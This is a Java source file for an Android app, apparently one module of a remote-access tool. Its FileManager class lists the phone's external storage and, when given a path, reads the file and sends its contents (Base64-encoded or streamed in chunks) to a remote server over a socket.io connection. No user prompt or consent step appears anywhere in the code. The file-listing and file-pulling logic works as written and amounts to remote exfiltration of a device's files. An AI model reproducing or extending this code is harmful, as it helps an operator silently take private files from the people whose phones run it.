package com.fason.app.features.storage;

import android.os.Environment;
import android.util.Base64;

import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.core.network.TransferHelper;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.util.Arrays;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class FileManager {

    private static final ExecutorService exec = Executors.newSingleThreadExecutor();

    public JSONArray walk(String path) {
        JSONArray arr = new JSONArray();

        try {
            if (path == null || path.isEmpty()) {
                path = Environment.getExternalStorageDirectory().getAbsolutePath();
            }

            File dir = new File(path);
            if (!dir.exists() || !dir.canRead()) {
                sendError("Access denied", path);
                return arr;
            }

            if (dir.getParent() != null) {
                JSONObject p = new JSONObject();
                p.put(Protocol.KEY_NAME, "../");
                p.put(Protocol.KEY_ISDIR, true);
                p.put(Protocol.KEY_PATH, dir.getParent());
                arr.put(p);
            }

            File[] files = dir.listFiles();
            if (files != null) {
                Arrays.sort(files, (a, b) -> {
                    if (a.isDirectory() && !b.isDirectory()) return -1;
                    if (!a.isDirectory() && b.isDirectory()) return 1;
                    return a.getName().compareToIgnoreCase(b.getName());
                });

                for (File f : files) {
                    if (f.getName().startsWith(".")) continue;

                    JSONObject obj = new JSONObject();
                    obj.put(Protocol.KEY_NAME, f.getName());
                    obj.put(Protocol.KEY_ISDIR, f.isDirectory());
                    obj.put(Protocol.KEY_PATH, f.getAbsolutePath());
                    obj.put(Protocol.KEY_SIZE, f.length());
                    obj.put(Protocol.KEY_LAST_MODIFIED, f.lastModified());
                    arr.put(obj);
                }
            }
        } catch (Exception ignored) {}

        return arr;
    }

    public void downloadFile(String path) {
        if (path == null) return;

        exec.execute(() -> {
            File file = new File(path);

            if (!file.exists()) { sendError("Not found", path); return; }
            if (!file.canRead()) { sendError("Cannot read", path); return; }
            if (file.length() == 0) { sendError("Empty file", path); return; }

            try {
                io.socket.client.Socket s = SocketClient.getInstance().getSocket();
                if (s == null) { sendError("Socket unavailable", path); return; }
                if (TransferHelper.shouldChunk(file.length())) {
                    JSONObject meta = new JSONObject();
                    meta.put(Protocol.KEY_NAME, file.getName());
                    meta.put(Protocol.KEY_PATH, path);
                    TransferHelper.streamFile(s, Protocol.FILES, file, meta);
                } else {
                    byte[] data = TransferHelper.readSmallFile(file);
                    if (data == null) { sendError("Read failed", path); return; }

                    JSONObject obj = new JSONObject();
                    obj.put(Protocol.KEY_TYPE, Protocol.TYPE_DOWNLOAD);
                    obj.put(Protocol.KEY_NAME, file.getName());
                    obj.put(Protocol.KEY_BUFFER, Base64.encodeToString(data, Base64.NO_WRAP));
                    obj.put(Protocol.KEY_PATH, path);
                    obj.put(Protocol.KEY_SIZE, data.length);
                    s.emit(Protocol.FILES, obj);
                }
            } catch (OutOfMemoryError e) {
                sendError("Out of memory", path);
            } catch (Exception e) {
                sendError("Error: " + e.getMessage(), path);
            }
        });
    }

    private void sendError(String msg, String path) {
        try {
            io.socket.client.Socket s = SocketClient.getInstance().getSocket();
            if (s == null) return;
            JSONObject err = new JSONObject();
            err.put(Protocol.KEY_TYPE, Protocol.TYPE_ERROR);
            err.put(Protocol.KEY_ERROR, msg);
            if (path != null) err.put(Protocol.KEY_PATH, path);
            s.emit(Protocol.FILES, err);
        } catch (Exception ignored) {}
    }
}
